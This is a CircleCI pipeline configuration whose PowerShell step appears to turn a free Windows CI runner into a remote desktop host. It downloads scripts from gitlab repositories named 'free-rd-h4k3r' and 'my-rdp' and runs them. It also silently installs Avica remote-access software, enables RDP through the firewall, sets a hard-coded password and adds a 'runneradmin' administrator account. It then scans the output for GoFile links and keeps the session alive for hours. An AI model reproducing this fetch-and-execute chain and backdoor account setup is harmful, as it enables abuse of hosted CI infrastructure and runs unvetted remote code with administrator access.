version: 2.1
orbs:
  win: circleci/windows@5.0
jobs:
  build:
    executor:
      name: win/default
      size: medium
    
    steps:
      - run:
          name: Debug Setup with Verbose Output
          shell: powershell.exe
          no_output_timeout: 45m  # Increased timeout
          command: |
            Write-Host "üöÄ Starting debug setup..." -ForegroundColor Green
            
            # Show environment info
            Write-Host "üîç Environment Info:" -ForegroundColor Cyan
            Write-Host "User: $env:USERNAME"
            Write-Host "Computer: $env:COMPUTERNAME" 
            Write-Host "Python Version:" -NoNewline
            python --version
            
            # Download files with error checking
            Write-Host "`nüì• Downloading files..." -ForegroundColor Yellow
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/free-rd-h4k3r/-/raw/main/setup.py" -OutFile "setup.py"
                Write-Host "‚úÖ setup.py downloaded ($(Get-Item setup.py | Select-Object -ExpandProperty Length) bytes)"
            } catch {
                Write-Host "‚ùå Failed to download setup.py: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Write-Host "Downloading Avica (this may take a while)..."
                Invoke-WebRequest -Uri "https://download.avica.com/AvicaLite_v8.0.8.9.exe" -OutFile "Avica_setup.exe" -TimeoutSec 300
                Write-Host "‚úÖ Avica_setup.exe downloaded ($(Get-Item Avica_setup.exe | Select-Object -ExpandProperty Length) bytes)"
            } catch {
                Write-Host "‚ùå Failed to download Avica: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "Trying alternative Avica download..."
                try {
                    Invoke-WebRequest -Uri "https://www.avica.com/en/download/windows" -OutFile "avica_page.html"
                    Write-Host "‚ö†Ô∏è Could not download Avica directly, setup will continue without it" -ForegroundColor Yellow
                } catch {
                    Write-Host "‚ö†Ô∏è Alternative download also failed, continuing..." -ForegroundColor Yellow
                }
            }
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/my-rdp/-/raw/main/show.bat" -OutFile "show.bat"
                Write-Host "‚úÖ show.bat downloaded"
            } catch {
                Write-Host "‚ùå Failed to download show.bat: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/my-rdp/-/raw/main/loop.bat" -OutFile "loop.bat" 
                Write-Host "‚úÖ loop.bat downloaded"
            } catch {
                Write-Host "‚ùå Failed to download loop.bat: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            # List downloaded files
            Write-Host "`nüìÅ Downloaded Files:"
            Get-ChildItem -Filter "*.py" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            Get-ChildItem -Filter "*.exe" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            Get-ChildItem -Filter "*.bat" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            
            # Install packages with verbose output
            Write-Host "`nüì¶ Installing Python packages..." -ForegroundColor Yellow
            Write-Host "Installing requests..."
            python.exe -m pip install requests --quiet --no-warn-script-location
            Write-Host "Installing Pillow..."
            python.exe -m pip install Pillow --quiet --no-warn-script-location
            Write-Host "Installing pyautogui..."
            python.exe -m pip install pyautogui --quiet --no-warn-script-location
            Write-Host "Installing telegraph..."
            python.exe -m pip install telegraph --quiet --no-warn-script-location
            Write-Host "‚úÖ All packages installed"
            
            # Enable RDP
            Write-Host "`nüîß Enabling RDP..." -ForegroundColor Yellow
            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
            Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
            Write-Host "‚úÖ RDP enabled"
            
            # User setup
            Write-Host "`nüë§ Setting up users..." -ForegroundColor Yellow
            $currentUser = $env:USERNAME
            Write-Host "Current user: $currentUser"
            
            net user $currentUser TheDisa1a 2>$null
            Write-Host "‚úÖ Password set for $currentUser"
            
            net user runneradmin TheDisa1a /add 2>$null
            if ($LASTEXITCODE -eq 0) {
                net localgroup administrators runneradmin /add 2>$null
                Write-Host "‚úÖ runneradmin user created and added to administrators"
            } else {
                Write-Host "‚ö†Ô∏è Could not create runneradmin user (this is normal in CircleCI)" -ForegroundColor Yellow
            }
            
            # Start Avica installation
            Write-Host "`n‚ö° Starting Avica installation..." -ForegroundColor Yellow
            if (Test-Path "Avica_setup.exe") {
                try {
                    $avicaProcess = Start-Process "Avica_setup.exe" -ArgumentList "/S" -PassThru -NoNewWindow
                    Write-Host "‚úÖ Avica process started (PID: $($avicaProcess.Id))"
                    
                    # Wait longer for installation
                    Write-Host "‚è≥ Waiting for Avica installation (60 seconds)..."
                    Start-Sleep -Seconds 60
                    
                    # Check if Avica is running
                    $avicaRunning = Get-Process | Where-Object {$_.ProcessName -like "*avica*"}
                    if ($avicaRunning) {
                        Write-Host "‚úÖ Avica processes found:" -ForegroundColor Green
                        $avicaRunning | Select-Object ProcessName, Id | Format-Table
                    } else {
                        Write-Host "‚ö†Ô∏è No Avica processes found yet" -ForegroundColor Yellow
                    }
                } catch {
                    Write-Host "‚ùå Error starting Avica: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "‚ö†Ô∏è Avica_setup.exe not found, skipping installation" -ForegroundColor Yellow
            }
            
            # Run setup.py with much longer timeout and real-time output
            Write-Host "`nüêç Running setup.py..." -ForegroundColor Yellow
            if (Test-Path "setup.py") {
                try {
                    $env:PYTHONUNBUFFERED = "1"
                    Write-Host "Executing: python setup.py"
                    
                    # Use Start-Process instead of job for real-time output
                    $psi = New-Object System.Diagnostics.ProcessStartInfo
                    $psi.FileName = "python"
                    $psi.Arguments = "setup.py"
                    $psi.RedirectStandardOutput = $true
                    $psi.RedirectStandardError = $true
                    $psi.UseShellExecute = $false
                    $psi.CreateNoWindow = $true
                    
                    $process = New-Object System.Diagnostics.Process
                    $process.StartInfo = $psi
                    $process.Start() | Out-Null
                    
                    # Read output in real-time
                    $timeout = 1200 # 20 minutes
                    $timer = [System.Diagnostics.Stopwatch]::StartNew()
                    
                    while (!$process.HasExited -and $timer.Elapsed.TotalSeconds -lt $timeout) {
                        if (!$process.StandardOutput.EndOfStream) {
                            $line = $process.StandardOutput.ReadLine()
                            if ($line) {
                                Write-Host "  $line" -ForegroundColor White
                                # Look for GoFile link in output
                                if ($line -match "gofile\.io") {
                                    Write-Host "üéâ FOUND GOFILE LINK: $line" -ForegroundColor Green -BackgroundColor Black
                                }
                            }
                        }
                        Start-Sleep -Milliseconds 100
                    }
                    
                    if (!$process.HasExited) {
                        Write-Host "‚ö†Ô∏è Process timed out after $timeout seconds" -ForegroundColor Yellow
                        $process.Kill()
                    } else {
                        Write-Host "‚úÖ setup.py completed with exit code: $($process.ExitCode)" -ForegroundColor Green
                    }
                    
                    $timer.Stop()
                    
                } catch {
                    Write-Host "‚ùå Error running setup.py: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "‚ùå setup.py file not found!" -ForegroundColor Red
            }
            
            # Check show.bat for GoFile link
            Write-Host "`nüîç Checking show.bat for GoFile link..." -ForegroundColor Cyan
            if (Test-Path "show.bat") {
                $showContent = Get-Content "show.bat"
                $gofileLines = $showContent | Where-Object { $_ -match "gofile\.io" }
                if ($gofileLines) {
                    Write-Host "üéâ GOFILE LINKS FOUND IN show.bat:" -ForegroundColor Green -BackgroundColor Black
                    $gofileLines | ForEach-Object {
                        Write-Host "  $_" -ForegroundColor Yellow
                    }
                } else {
                    Write-Host "‚ùå No GoFile links found in show.bat" -ForegroundColor Red
                }
            }
            
            Write-Host "`nüéâ Debug setup completed!" -ForegroundColor Green
            
      - run:
          name: Start Services and Keep Active
          shell: cmd.exe
          no_output_timeout: 6h
          command: |
            echo üîß Starting services...
            if exist show.bat (
                echo Found show.bat, executing...
                call show.bat
            ) else (
                echo show.bat not found!
            )
            
            echo üöÄ Keeping session active...
            if exist loop.bat (
                call loop.bat
            ) else (
                echo loop.bat not found, using simple loop...
                :loop
                timeout /t 300 /nobreak >nul 2>&1
                echo Still running... %time%
                goto loop
            )

workflows:
  version: 2
  rdp-workflow:
    jobs:
      - build